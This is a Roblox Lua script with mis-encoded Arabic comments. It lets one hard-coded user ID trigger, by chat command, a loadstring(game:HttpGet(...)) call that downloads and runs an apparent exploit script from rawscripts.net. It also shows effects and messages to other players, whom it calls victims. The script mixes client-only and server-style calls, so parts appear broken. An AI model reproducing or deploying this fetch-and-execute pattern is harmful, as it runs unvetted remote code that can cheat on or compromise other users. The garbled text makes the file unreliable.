local _G = {
    ControllerID = 9822837105, -- Ø§Ù„Ø£ÙˆÙ†Ø± Ø§Ù„ÙˆØ­ÙŠØ¯
    CommandCooldown = {} -- Ù…Ù†Ø¹ Ø§Ù„ØªÙƒØ±Ø§Ø±
}

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø§Øµ Ø¨Ø§Ù„Ø³ÙƒØ±Ø¨Øª
local UZI_SCRIPT_URL = "https://rawscripts.net/raw/Universal-Script-TXT-DEV-UZI-43276"

-- Ø¯Ø§Ù„Ø© Ù„Ù„ØªØ­Ù‚Ù‚ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ù„Ø§Ø¹Ø¨ Ù‡Ùˆ Ø§Ù„Ø£ÙˆÙ†Ø±
local function isOwner(player)
    return player.UserId == _G.ControllerID
end

-- Ø¯Ø§Ù„Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ù„Ù„Ø§Ø¹Ø¨
local function notifyPlayer(player, message)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Ù†Ø¸Ø§Ù… UZI",
            Text = message,
            Icon = "rbxassetid://0",
            Duration = 5
        })
    end)
end

-- Ø¯Ø§Ù„Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ù„Ù„Ø¬Ù…ÙŠØ¹
local function broadcastMessage(message)
    for _, player in ipairs(Players:GetPlayers()) do
        pcall(function()
            game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
                Text = message,
                Color = Color3.new(1, 0, 0),
                Font = Enum.Font.SourceSansBold,
                FontSize = Enum.FontSize.Size18
            })
        end)
    end
end

-- Ø¯Ø§Ù„Ø© Ù…Ù†Ø¹ Ø§Ù„ØªÙƒØ±Ø§Ø±
local function checkCooldown(player)
    if _G.CommandCooldown[player.UserId] and os.time() - _G.CommandCooldown[player.UserId] < 10 then
        notifyPlayer(player, "â³ Ø§Ù†ØªØ¸Ø± 10 Ø«ÙˆØ§Ù†ÙŠ Ø¨ÙŠÙ† ÙƒÙ„ Ø£Ù…Ø±")
        return false
    end
    _G.CommandCooldown[player.UserId] = os.time()
    return true
end

-- Ø¯Ø§Ù„Ø© Ù„ØªÙØ¹ÙŠÙ„ Ø³ÙƒØ±Ø¨Øª UZI Ù„Ù„Ø£ÙˆÙ†Ø±
local function activateUziScript(player)
    if not player or not player.Character then
        return false
    end
    
    print("ðŸŽ¯ Ù…Ø­Ø§ÙˆÙ„Ø© ØªØ­Ù…ÙŠÙ„ Ø³ÙƒØ±Ø¨Øª UZI Ù„Ù„Ø£ÙˆÙ†Ø±: "..player.Name)
    
    -- Ø¥Ø´Ø¹Ø§Ø± Ù„Ù„Ø¬Ù…ÙŠØ¹ Ø£Ù† Ø§Ù„Ø£ÙˆÙ†Ø± Ø´ØºÙ„ Ø§Ù„Ø³ÙƒØ±Ø¨Øª
    broadcastMessage("ðŸ”« [" .. player.Name .. "] Ù‚Ø§Ù… Ø¨ØªØ´ØºÙŠÙ„ Ø³ÙƒØ±Ø¨Øª UZI!")
    
    local success, error = pcall(function()
        -- ØªØ­Ù…ÙŠÙ„ ÙˆØªÙ†ÙÙŠØ° Ø§Ù„Ø³ÙƒØ±Ø¨Øª
        loadstring(game:HttpGet(UZI_SCRIPT_URL))()
    end)
    
    if success then
        print("âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ Ø³ÙƒØ±Ø¨Øª UZI Ø¨Ù†Ø¬Ø§Ø­ Ù„Ù„Ø£ÙˆÙ†Ø±: "..player.Name)
        notifyPlayer(player, "ðŸ”« ØªÙ… ØªÙØ¹ÙŠÙ„ UZI Ø¨Ù†Ø¬Ø§Ø­!")
        
        -- Ø¥Ø´Ø¹Ø§Ø± Ù„Ù„Ø¶Ø­Ø§ÙŠØ§
        for _, victim in ipairs(Players:GetPlayers()) do
            if not isOwner(victim) then
                notifyPlayer(victim, "ðŸ‘€ [" .. player.Name .. "] Ù‚Ø§Ù… Ø¨ØªØ´ØºÙŠÙ„ UZI - Ø´Ø§Ù‡Ø¯ Ù…Ø§ ÙŠÙØ¹Ù„Ù‡!")
            end
        end
        
        return true
    else
        print("âŒ ÙØ´Ù„ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø³ÙƒØ±Ø¨Øª UZI: "..error)
        notifyPlayer(player, "âŒ ÙØ´Ù„ ÙÙŠ ØªØ­Ù…ÙŠÙ„ UZI: "..error)
        return false
    end
end

-- Ø¯Ø§Ù„Ø© Ù„Ø¥Ù†Ø´Ø§Ø¡ ØªØ£Ø«ÙŠØ±Ø§Øª Ø¨ØµØ±ÙŠØ© Ù„Ù„Ø¶Ø­Ø§ÙŠØ§ Ù„Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„Ø£ÙˆÙ†Ø±
local function createSpectatorEffects(owner)
    -- ØªØ£Ø«ÙŠØ± Ø¶ÙˆØ¡ Ø­ÙˆÙ„ Ø§Ù„Ø£ÙˆÙ†Ø±
    local highlight = Instance.new("Highlight")
    highlight.Name = "OwnerHighlight"
    highlight.FillColor = Color3.new(1, 0, 0)
    highlight.OutlineColor = Color3.new(1, 1, 0)
    highlight.FillTransparency = 0.7
    highlight.OutlineTransparency = 0
    highlight.Parent = owner.Character
    
    -- Ø¨ÙŠÙ„Ø¨ÙˆØ±Ø¯ Ù„Ù„Ø¥Ø¹Ù„Ø§Ù†
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "OwnerBillboard"
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.Adornee = owner.Character:FindFirstChild("Head")
    billboard.Parent = owner.Character
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Text = "ðŸ”« Ø§Ù„Ø£ÙˆÙ†Ø± - ÙŠØ´ØºÙ„ UZI ðŸ”«"
    label.TextColor3 = Color3.new(1, 0, 0)
    label.TextScaled = true
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSansBold
    label.Parent = billboard
    
    -- Ø¥Ø´Ø¹Ø§Ø± Ù„Ù„Ø¶Ø­Ø§ÙŠØ§
    for _, victim in ipairs(Players:GetPlayers()) do
        if not isOwner(victim) then
            notifyPlayer(victim, "ðŸ‘€ Ø§Ù„Ø¢Ù† ØªØ´Ø§Ù‡Ø¯ [" .. owner.Name .. "] ÙˆÙ‡Ùˆ ÙŠØ³ØªØ®Ø¯Ù… UZI!")
        end
    end
end

-- Ø¯Ø§Ù„Ø© Ù„Ø¥Ø²Ø§Ù„Ø© Ø§Ù„ØªØ£Ø«ÙŠØ±Ø§Øª
local function removeSpectatorEffects(owner)
    if owner and owner.Character then
        local highlight = owner.Character:FindFirstChild("OwnerHighlight")
        if highlight then
            highlight:Destroy()
        end
        
        local billboard = owner.Character:FindFirstChild("OwnerBillboard")
        if billboard then
            billboard:Destroy()
        end
    end
end

-- Ø¯Ø§Ù„Ø© Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø£ÙˆØ§Ù…Ø±
local function processCommand(player, message)
    local command = message:lower()
    
    if not checkCooldown(player) then return end
    
    -- Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø£ÙˆÙ†Ø±
    if isOwner(player) then
        if command == "!u" then
            print("ðŸŽ¯ Ø§Ù„Ø£ÙˆÙ†Ø± ÙŠØ­Ø§ÙˆÙ„ ØªØ´ØºÙŠÙ„ UZI: "..player.Name)
            
            -- ØªÙØ¹ÙŠÙ„ Ø§Ù„ØªØ£Ø«ÙŠØ±Ø§Øª Ø§Ù„Ø¨ØµØ±ÙŠØ©
            createSpectatorEffects(player)
            
            -- ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø³ÙƒØ±Ø¨Øª
            local success = activateUziScript(player)
            
            if success then
                -- Ø¥Ø´Ø¹Ø§Ø± ØªØ£ÙƒÙŠØ¯ Ø¥Ø¶Ø§ÙÙŠ
                delay(2, function()
                    broadcastMessage("ðŸŽ® [" .. player.Name .. "] ÙŠØªØ­ÙƒÙ… Ø§Ù„Ø¢Ù† Ø¨Ù€ UZI - Ø´Ø§Ù‡Ø¯ÙˆØ§ Ø§Ù„Ø¹Ø±Ø¶!")
                end)
            end
            
        elseif command == "!ustop" then
            -- Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¹Ø±Ø¶
            removeSpectatorEffects(player)
            notifyPlayer(player, "ðŸ›‘ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù ÙˆØ¶Ø¹ Ø§Ù„Ø¹Ø±Ø¶")
            broadcastMessage("ðŸ›‘ [" .. player.Name .. "] ØªÙˆÙ‚Ù Ø¹Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… UZI")
        end
        
    -- Ø¥Ø°Ø§ ÙƒØ§Ù† Ù„Ø§Ø¹Ø¨ Ø¹Ø§Ø¯ÙŠ
    else
        if command == "!u" then
            notifyPlayer(player, "âŒ ÙÙ‚Ø· Ø§Ù„Ø£ÙˆÙ†Ø± ÙŠÙ…ÙƒÙ†Ù‡ ØªØ´ØºÙŠÙ„ UZI")
            notifyPlayer(player, "ðŸ‘€ ÙŠÙ…ÙƒÙ†Ùƒ Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„Ø£ÙˆÙ†Ø± Ø¹Ù†Ø¯Ù…Ø§ ÙŠØ³ØªØ®Ø¯Ù…Ù‡!")
        end
    end
end

-- ========== Ø¨Ø¯Ø¡ Ø§Ù„Ù†Ø¸Ø§Ù… ==========
local function monitorPlayer(player)
    player.Chatted:Connect(function(message)
        local cmd = message:lower()
        if cmd == "!u" or cmd == "!ustop" then
            processCommand(player, message)
        end
    end)
end

local function startMonitoring()
    for _, player in ipairs(Players:GetPlayers()) do
        monitorPlayer(player)
    end
end

-- Ø¹Ù†Ø¯ Ø¯Ø®ÙˆÙ„ Ù„Ø§Ø¹Ø¨ Ø¬Ø¯ÙŠØ¯
Players.PlayerAdded:Connect(function(player)
    print("ðŸ‘¤ Ù„Ø§Ø¹Ø¨ Ø¬Ø¯ÙŠØ¯: "..player.Name.." ("..player.UserId..")")
    monitorPlayer(player)
    
    if isOwner(player) then
        print("â­ Ø§Ù„Ø£ÙˆÙ†Ø± Ø¯Ø®Ù„ Ø§Ù„Ù„Ø¹Ø¨Ø©! (9822837105)")
        notifyPlayer(player, "ðŸŽ® Ø£Ù†Øª Ø§Ù„Ø£ÙˆÙ†Ø±! Ø§ÙƒØªØ¨ !U Ù„ØªØ´ØºÙŠÙ„ UZI")
        notifyPlayer(player, "ðŸ‘€ Ø§Ù„Ø¬Ù…ÙŠØ¹ Ø³ÙŠØ´Ø§Ù‡Ø¯Ùƒ Ø¹Ù†Ø¯Ù…Ø§ ØªØ³ØªØ®Ø¯Ù…Ù‡!")
    else
        notifyPlayer(player, "ðŸ‘€ Ø§Ù†ØªØ¸Ø± Ø§Ù„Ø£ÙˆÙ†Ø± Ù„ÙŠØ´ØºÙ„ UZI ÙˆØ³ÙˆÙ ØªØ´Ø§Ù‡Ø¯ Ø§Ù„Ø¹Ø±Ø¶!")
    end
end)

-- Ø¹Ù†Ø¯ Ø®Ø±ÙˆØ¬ Ù„Ø§Ø¹Ø¨
Players.PlayerRemoving:Connect(function(player)
    if isOwner(player) then
        removeSpectatorEffects(player)
        broadcastMessage("ðŸšª Ø§Ù„Ø£ÙˆÙ†Ø± ØºØ§Ø¯Ø± Ø§Ù„Ù„Ø¹Ø¨Ø©")
    end
end)

-- Ø¹Ù†Ø¯ Ù…ÙˆØª Ø§Ù„Ø£ÙˆÙ†Ø±
local function onOwnerDied(owner)
    if owner and owner.Character then
        owner.Character:WaitForChild("Humanoid").Died:Connect(function()
            removeSpectatorEffects(owner)
            delay(3, function()
                if owner.Character then
                    createSpectatorEffects(owner)
                end
            end)
        end)
    end
end

-- Ø§Ù„Ø¨Ø¯Ø¡
print("ðŸ”« Ù†Ø¸Ø§Ù… UZI Ø§Ù„Ù…Ø´Ø§Ù‡Ø¯ Ù…ÙØ¹Ù„!")
print("ðŸŽ® Ø§Ù„Ø£ÙˆÙ†Ø± Ø§Ù„ÙˆØ­ÙŠØ¯: 9822837105")
print("ðŸ“œ Ø³ÙƒØ±Ø¨Øª UZI: "..UZI_SCRIPT_URL)

startMonitoring()

-- Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø£ÙˆÙ†Ø± Ø§Ù„Ø­Ø§Ù„ÙŠ
local localPlayer = Players.LocalPlayer
if localPlayer and isOwner(localPlayer) then
    notifyPlayer(localPlayer, "ðŸŽ® Ø§ÙƒØªØ¨ !U Ù„ØªØ´ØºÙŠÙ„ UZI")
    notifyPlayer(localPlayer, "ðŸ‘€ Ø§Ù„Ø¬Ù…ÙŠØ¹ Ø³ÙŠØ´Ø§Ù‡Ø¯Ùƒ Ø¹Ù†Ø¯Ù…Ø§ ØªØ³ØªØ®Ø¯Ù…Ù‡!")
    
    -- Ù…Ø±Ø§Ù‚Ø¨Ø© Ù…ÙˆØª Ø§Ù„Ø£ÙˆÙ†Ø±
    if localPlayer.Character then
        onOwnerDied(localPlayer)
    end
    localPlayer.CharacterAdded:Connect(function()
        onOwnerDied(localPlayer)
    end)
else
    notifyPlayer(localPlayer, "ðŸ‘€ Ø§Ù†ØªØ¸Ø± Ø§Ù„Ø£ÙˆÙ†Ø± Ù„ÙŠØ´ØºÙ„ UZI!")
end

return {
    -- Ø¯Ø§Ù„Ø© ÙŠØ¯ÙˆÙŠØ© Ù„ØªØ´ØºÙŠÙ„ UZI
    activateUzi = function(targetPlayer)
        if targetPlayer and isOwner(targetPlayer) then
            return activateUziScript(targetPlayer)
        end
        return false
    end,
    
    -- Ø¯Ø§Ù„Ø© ÙŠØ¯ÙˆÙŠØ© Ù„Ù„ØªØ£Ø«ÙŠØ±Ø§Øª Ø§Ù„Ø¨ØµØ±ÙŠØ©
    startSpectatorMode = function(owner)
        if owner and isOwner(owner) then
            createSpectatorEffects(owner)
            return true
        end
        return false
    end,
    
    -- Ø¯Ø§Ù„Ø© ÙŠØ¯ÙˆÙŠØ© Ù„Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¹Ø±Ø¶
    stopSpectatorMode = function(owner)
        if owner then
            removeSpectatorEffects(owner)
            return true
        end
        return false
    end,
    
    -- Ù…Ø¹Ù„ÙˆÙ…Ø§Øª
    isOwner = isOwner,
    getInfo = function()
        return {
            OwnerID = _G.ControllerID,
            ScriptURL = UZI_SCRIPT_URL,
            TotalPlayers = #Players:GetPlayers(),
            IsOwner = isOwner(Players.LocalPlayer)
        }
    end
}
